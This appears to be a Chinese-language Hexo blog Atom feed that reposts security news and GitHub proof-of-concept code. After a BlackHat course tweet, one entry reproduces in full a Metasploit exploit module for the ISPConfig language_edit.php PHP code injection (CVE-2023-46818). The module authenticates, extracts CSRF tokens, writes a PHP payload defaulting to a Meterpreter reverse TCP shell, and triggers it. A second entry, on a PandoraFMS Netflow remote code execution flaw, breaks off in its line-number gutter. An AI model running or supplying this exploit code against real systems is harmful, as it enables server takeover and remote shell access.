<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>liancc&#39; infos blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-06-27T14:00:29.779Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>lianccc</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/06/27/twitter_1837605125/"/>
    <id>http://example.com/2025/06/27/twitter_1837605125/</id>
    <published>2025-06-27T14:00:29.783Z</published>
    <updated>2025-06-27T14:00:29.779Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 加入#BlackHat秋季培训课程“应用数据科学与人工智能于网络安全（在线）”。这门为期两天的互动课程教授安全专业人士如何利用数据科学技术分析网络和安全数据，揭示宝贵见解。课程内容包括数据准备、特征工程、探索性数据分析、数据可视化、机器学习、模型评估以及大规模实施，全部聚焦于安全相关的问题。立即注册&gt;&gt; <a href="https://t.co/UTq7Zlc057">https://t.co/UTq7Zlc057</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1938588376422056154">https://x.com/BlackHatEvents/status/1938588376422056154</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 加入#BlackHat秋季培训课程“应用数据科学与人工智能于网络安全（在线）”。这门为期两天的互动课程教授安全专业人士如何利用数据科学技术分析网络</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>ISPConfig language_editphp PHP代码注入</title>
    <link href="http://example.com/2025/06/27/github_457305466/"/>
    <id>http://example.com/2025/06/27/github_457305466/</id>
    <published>2025-06-27T13:45:26.208Z</published>
    <updated>2025-06-27T13:45:26.204Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ISPConfig language_edit.php PHP代码注入</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-46818</li></ul><p><strong>漏洞类型：</strong> 代码注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> ISPConfig在3.2.11p1之前的版本中，语言文件编辑器存在PHP代码注入漏洞。当admin_allow_langedit启用时，管理员可以利用此漏洞注入PHP代码。</p><p><strong>产品厂商：</strong> ISPConfig</p><p><strong>产品名称：</strong> ISPConfig</p><p><strong>影响版本：</strong> version &lt; 3.2.11p1</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/016f4ea14207f629f77d100747034c7319924f03/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb">https://github.com/rapid7/metasploit-framework/blob/016f4ea14207f629f77d100747034c7319924f03/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote<br>  Rank = ExcellentRanking<br><br>  prepend Msf::Exploit::Remote::AutoCheck<br>  include Msf::Exploit::Remote::HttpClient<br>  include Msf::Exploit::FileDropper<br><br>  def initialize(info = &#123;&#125;)<br>    super(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;ISPConfig language_edit.php PHP Code Injection&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          An issue was discovered <span class="hljs-keyword">in</span> ISPConfig before <span class="hljs-number">3.2</span>.<span class="hljs-number">11p</span>1. PHP code injection can be achieved <span class="hljs-keyword">in</span> the language file editor <span class="hljs-keyword">by</span> an admin <span class="hljs-keyword">if</span> admin_allow_langedit <span class="hljs-keyword">is</span> enabled.<br>        &#125;,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;syfi&#x27;</span> <span class="hljs-comment"># Discovery and PoC</span><br>        ],<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://github.com/SyFi/CVE-2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/KIS-2023-13&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/pocs/CVE-2023-46818.php&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_PHP,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Automatic PHP&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_PHP<br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2023-10-24&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;PAYLOAD&#x27;</span> =&gt; <span class="hljs-string">&#x27;php/meterpreter/reverse_tcp&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;TARGETURI&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;The URI path to ISPConfig&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator username&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator password&#x27;</span>])<br>    ])<br>  end<br><br>  def check<br>    print_status(<span class="hljs-string">&#x27;Checking if the target is ISPConfig...&#x27;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>)<br>    &#125;)<br>    <span class="hljs-keyword">return</span> CheckCode::Unknown <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res.body.include?(<span class="hljs-string">&#x27;ISPConfig&#x27;</span>) &amp;&amp; (res.body.include?(<span class="hljs-string">&#x27;login&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;username&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;password&#x27;</span>))<br>      print_good(<span class="hljs-string">&#x27;ISPConfig installation detected&#x27;</span>)<br>      <span class="hljs-keyword">return</span> CheckCode::Detected<br>    end<br>    CheckCode::Safe<br>  end<br><br>  def authenticate<br>    print_status(<span class="hljs-string">&quot;Attempting login with username &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]&#125;</span>&#x27; and password &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]&#125;</span>&#x27;&quot;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>        <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Login request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res.body.match(<span class="hljs-regexp">/Username or Password wrong/i</span>)<br>      fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Login failed: Invalid credentials&#x27;</span>)<br>    end<br>    <span class="hljs-keyword">if</span> res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>] &amp;&amp; res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>].include?(<span class="hljs-string">&#x27;admin&#x27;</span>) ||<br>       res.body.downcase.include?(<span class="hljs-string">&#x27;dashboard&#x27;</span>)<br>      print_good(<span class="hljs-string">&#x27;Login successful!&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    end<br>    print_warning(<span class="hljs-string">&#x27;Login status unclear, attempting to continue...&#x27;</span>)<br>    <span class="hljs-literal">true</span><br>  end<br><br>  def inject_payload<br>    print_status(<span class="hljs-string">&#x27;Injecting PHP payload...&#x27;</span>)<br>    @payload_file = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;Rex::Text.rand_text_alpha_lower(<span class="hljs-number">8</span>)&#125;</span>.php&quot;</span><br>    php_payload = payload.encoded<br>    injection = <span class="hljs-string">&quot;&#x27;];file_put_contents(&#x27;<span class="hljs-subst">#&#123;@payload_file&#125;</span>&#x27;,&#x27;&lt;?php <span class="hljs-subst">#&#123;php_payload&#125;</span> ?&gt;&#x27;);die;#&quot;</span><br>    lang_file = Rex::Text.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Unable to access language_edit.php&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    csrf_id_match = res.body.match(<span class="hljs-regexp">/_csrf_id&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    csrf_key_match = res.body.match(<span class="hljs-regexp">/_csrf_key&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    <span class="hljs-keyword">unless</span> csrf_id_match &amp;&amp; csrf_key_match<br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;CSRF tokens not found!&#x27;</span>)<br>    end<br>    csrf_id = csrf_id_match[<span class="hljs-number">1</span>]<br>    csrf_key = csrf_key_match[<span class="hljs-number">1</span>]<br>    print_good(<span class="hljs-string">&quot;Extracted CSRF tokens: ID=<span class="hljs-subst">#&#123;csrf_id[<span class="hljs-number">0.</span>.<span class="hljs-number">10</span>]&#125;</span>..., KEY=<span class="hljs-subst">#&#123;csrf_key[<span class="hljs-number">0.</span>.<span class="hljs-number">10</span>]&#125;</span>...&quot;</span>)<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\\]&#x27;</span> =&gt; injection<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Injection request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    payload_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, @payload_file)<br>    print_good(<span class="hljs-string">&quot;Payload successfully injected: <span class="hljs-subst">#&#123;@payload_file&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload_url<br>  end<br><br>  def trigger_payload(payload_url)<br>    print_status(<span class="hljs-string">&#x27;Triggering PHP payload...&#x27;</span>)<br>    <span class="hljs-comment"># Small delay to ensure the file is written</span><br>    sleep(<span class="hljs-number">1</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; payload_url,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">if</span> res &amp;&amp; res.code == <span class="hljs-number">200</span><br>      print_good(<span class="hljs-string">&#x27;PHP payload triggered successfully&#x27;</span>)<br>    <span class="hljs-keyword">else</span><br>      print_warning(<span class="hljs-string">&#x27;Payload trigger response was unexpected&#x27;</span>)<br>    end<br>  end<br><br>  def cleanup<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> @payload_file<br>    print_status(<span class="hljs-string">&#x27;Cleaning up payload file...&#x27;</span>)<br>    <span class="hljs-comment"># Use the same vulnerability to delete the file</span><br>    injection = <span class="hljs-string">&quot;&#x27;];unlink(&#x27;<span class="hljs-subst">#&#123;@payload_file&#125;</span>&#x27;);die;#&quot;</span><br>    lang_file = Rex::Text.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> res<br>    csrf_id_match = res.body.match(<span class="hljs-regexp">/_csrf_id&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    csrf_key_match = res.body.match(<span class="hljs-regexp">/_csrf_key&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> csrf_id_match &amp;&amp; csrf_key_match<br>    csrf_id = csrf_id_match[<span class="hljs-number">1</span>]<br>    csrf_key = csrf_key_match[<span class="hljs-number">1</span>]<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\\]&#x27;</span> =&gt; injection<br>    &#125;<br>    send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    print_good(<span class="hljs-string">&quot;Payload file <span class="hljs-subst">#&#123;@payload_file&#125;</span> cleaned up&quot;</span>)<br>  end<br><br>  def exploit<br>    authenticate<br>    payload_url = inject_payload<br>    print_status(<span class="hljs-string">&#x27;Starting payload handler...&#x27;</span>)<br>    trigger_payload(payload_url)<br>    print_status(<span class="hljs-string">&#x27;Manual trigger information:&#x27;</span>)<br>    print_line(<span class="hljs-string">&quot;URL: <span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&quot;</span>)<br>    print_line(<span class="hljs-string">&quot;Manual trigger: curl &#x27;<span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&#x27;&quot;</span>)<br>  end<br>end<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ISPConfig language_edit.php PHP代码注入&lt;/p&gt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="代码注入" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>PandoraFMS Netflow Authenticated Remote Code Execution</title>
    <link href="http://example.com/2025/06/27/github_532550450/"/>
    <id>http://example.com/2025/06/27/github_532550450/</id>
    <published>2025-06-27T13:45:15.577Z</published>
    <updated>2025-06-27T13:45:15.572Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> PandoraFMS Netflow Authenticated Remote Code Execution</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-5306</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该模块利用了PandoraFMS的Netflow组件中的一个命令注入漏洞。模块需要一组用户凭证来修改Netflow设置。此外，系统上必须存在Netflow二进制文件。</p><p><strong>产品厂商：</strong> PandoraFMS</p><p><strong>产品名称：</strong> PandoraFMS</p><p><strong>影响版本：</strong> version &lt; 7.0.777.10</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/37e8780a6b8415e5515a81e6671973410eebd9f1/modules%2Fexploits%2Flinux%2Fhttp%2Fpandora_fms_auth_netflow_rce.rb">https://github.com/rapid7/metasploit-framework/blob/37e8780a6b8415e5515a81e6671973410eebd9f1/modules%2Fexploits%2Flinux%2Fhttp%2Fpandora_fms_auth_netflow_rce.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span 